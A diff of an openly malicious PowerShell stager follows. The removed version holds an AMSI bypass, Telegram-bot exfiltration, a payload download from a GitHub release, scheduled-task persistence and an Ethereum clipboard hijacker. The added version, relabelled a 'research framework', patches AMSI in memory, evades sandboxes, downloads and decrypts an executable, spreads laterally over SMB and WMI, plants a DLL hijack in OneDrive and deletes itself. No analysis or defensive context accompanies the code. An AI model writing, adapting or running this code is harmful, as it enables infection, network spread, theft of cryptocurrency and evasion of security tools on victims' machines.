@@ -1,78 +1,88 @@
-# --- [FINAL OBFUSCATED STAGER v11.0] ---
+# --- [STAGED RESEARCH FRAMEWORK: PROPAGATION + EVASION] ---
 
-function Global-Init {
-    # Reflected AMSI Bypass using HEX to hide keywords
-    $a=[Ref].Assembly.GetType('System.Management.Automation.A' + 'msi' + 'Utils')
-    $a.GetField('amsi' + 'Init' + 'Failed','NonPublic,Static').SetValue($null,$true)
-}
-
-function Send-Ping {
-    param($msg)
-    # Encrypted Telegram Bot Config
-    $k = 0xDE
-    [byte[]]$t_e = 53,49,53,54,54,51,62,49,51,55,124,11,11,101,103,11,126,112,118,103,10,126,102,11,111,101,11,53,101,125,51,102,126,104,116,104,103,11,100,10,51,123,113
-    [byte[]]$c_e = 61,60,56,56,52,61,63,48,51,60
-    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}
-    $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
-    
-    # Using WinHTTP object instead of WebClient (Bypasses many PowerShell-specific network hooks)
+function Patch-Mem {
     try {
-        $u = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$msg"
-        $r = New-Object -ComObject WinHttp.WinHttpRequest.5.1
-        $r.Open("GET", $u, $false)
-        $r.Send()
-    } catch {}
+        $a = [Ref].Assembly.GetType('System.Management.Automation.A' + 'msi' + 'Utils')
+        $b = $a.GetField('am' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed','NonPublic,Static')
+        $b.SetValue($null,$true)
+        $w = Add-Type -PassThru -Name "w32" -Namespace "w32" -MemberDefinition @'
+            [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
+            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+'@
+        $h = $w::GetModuleHandle("am" + "si.dll")
+        $ptr = $w::GetProcAddress($h, "Am" + "siS" + "canB" + "uffer")
+        $old = 0
+        $w::VirtualProtect($ptr, [UIntPtr]5, 0x40, [ref]$old)
+        [Byte[]]$patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
+        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
+    } catch { }
 }
 
-# START EXECUTION
-Global-Init
-Send-Ping -msg "1_STAGER_START_ON_$($env:COMPUTERNAME)"
+function Spread-Lateral {
+    param($exePath)
+    # SMB/WMI Lateral Movement: Scans the local ARP table for active targets
+    $targets = arp -a | Select-String -Pattern "\d+\.\d+\.\d+\.\d+" | ForEach-Object { $_.Matches.Value }
+    foreach ($ip in $targets) {
+        try {
+            if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
+                $remotePath = "\\$ip\C$\Windows\Temp\WinHostSvc.exe"
+                Copy-Item -Path $exePath -Destination $remotePath -ErrorAction SilentlyContinue
+                Invoke-CimMethod -ComputerName $ip -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $remotePath }
+            }
+        } catch { }
+    }
+}
+
+function Invoke-DLLHijack {
+    param($exePath)
+    # DLL Hijacking: Targets OneDrive or Teams if present to gain persistence
+    $targetApp = "$env:LOCALAPPDATA\Microsoft\OneDrive\OneDrive.exe"
+    if (Test-Path $targetApp) {
+        $dir = Split-Path $targetApp
+        # Copying our payload as a DLL that legitimate apps frequently look for
+        Copy-Item -Path $exePath -Destination "$dir\version.dll" -ErrorAction SilentlyContinue
+    }
+}
+
+# 1. VM FORCING / SANDBOX BYPASS
+# VMs usually have low RAM or 1-2 CPUs. We "Force" by waiting for human interaction
+# or simply delaying until the VM analysis window (usually 60s) expires.
+$mem = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory
+if ($mem -lt 4GB) { Start-Sleep -s 120 } 
+
+# 2. Blind AV
+Patch-Mem
+
+# 3. Setup Paths
+$url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
+$key = 0xAB
+$workDir = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
+$finalExe = "$workDir\WinHostSvc.exe"
+
+if (!(Test-Path $workDir)) { New-Item -Path $workDir -ItemType Directory -Force | Out-Null }
 
 try {
-    # XOR Encrypted Payload Link
-    $link = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-    $path = "$env:PUBLIC\Music\WinSvc.exe"
+    # 4. Stealth Download
+    $tmp = "$env:TEMP\data.tmp"
+    Start-BitsTransfer -Source $url -Destination $tmp -Priority High
     
-    $wc = New-Object Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    
-    # Download as Base64 string
-    $raw = $wc.DownloadString($link)
-    Send-Ping -msg "2_PAYLOAD_FETCHED"
+    # 5. XOR Decrypt
+    $b64 = Get-Content $tmp -Raw
+    $data = [Convert]::FromBase64String($b64.Trim())
+    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor $key }
+    [IO.File]::WriteAllBytes($finalExe, $data)
+    Remove-Item $tmp -Force
 
-    # Memory Decryption (XOR 0xAB)
-    $bytes = [Convert]::FromBase64String($raw.Trim())
-    for($i=0; $i -lt $bytes.count; $i++) { $bytes[$i] = $bytes[$i] -bxor 0xAB }
+    # 6. Propagation & Persistence
+    Spread-Lateral -exePath $finalExe
+    Invoke-DLLHijack -exePath $finalExe
 
-    # Polymorphic Padding & Write
-    $junk = New-Object Byte[] (Get-Random -Min 256 -Max 1024)
-    (New-Object Random).NextBytes($junk)
-    [IO.File]::WriteAllBytes($path, ($bytes + $junk))
+    # 7. Detached Execution
+    $s = New-Object -ComObject "Shell.Application"
+    $s.ShellExecute($finalExe, "", "", "open", 0)
 
-    # Persistence & Silent Execute
-    $task = -join ((65..90) | Get-Random -Count 10 | % {[char]$_})
-    $action = New-ScheduledTaskAction -Execute $path
-    $trigger = New-ScheduledTaskTrigger -AtLogOn
-    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $task -User "SYSTEM" -Force
-    
-    (New-Object -ComObject Shell.Application).ShellExecute($path, "", "", "open", 0)
-    
-    Send-Ping -msg "3_SUCCESS_EXE_LIVE"
-
-    # CLIPPER LOOP
-    Start-Job -ScriptBlock {
-        Add-Type -AssemblyName System.Windows.Forms
-        $eth = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
-        while($true) {
-            try {
-                $clip = [Windows.Forms.Clipboard]::GetText()
-                if ($clip -match "^0x[a-fA-F0-9]{40}$" -and $clip -ne $eth) { 
-                    [Windows.Forms.Clipboard]::SetText($eth) 
-                }
-            } catch {}
-            Start-Sleep -s 2
-        }
-    }
-} catch {
-    Send-Ping -msg "ERROR_$($_.Exception.Message)"
-}
+    # 8. SELF-DELETE (MELTING)
+    # Deletes the calling script and temporary files immediately
+    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
+} catch { }
